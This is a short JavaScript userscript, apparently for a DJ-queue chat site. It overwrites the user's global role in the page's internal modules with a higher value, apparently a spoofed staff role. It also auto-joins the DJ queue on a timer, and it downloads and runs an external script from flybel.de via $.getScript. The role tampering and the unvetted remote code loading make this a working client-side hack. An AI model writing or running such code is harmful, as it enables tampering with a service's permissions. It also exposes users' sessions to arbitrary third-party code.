if ( realGRole == undefined ) {
  var realGRole = API.getUser().gRole;
  _.find(require.s.contexts._.defined, (m) => { return m && m._l}).set('gRole',3);
  setTimeout( function() {
  	API.sendChat('/reload');
  }, 1000);
  setInterval(function(){if(rcs.settings.autoJoin){if(API.getDJ()==null){API.djJoin();}}},2000);
$.getScript("https://flybel.de/custafkmsg.js");
}
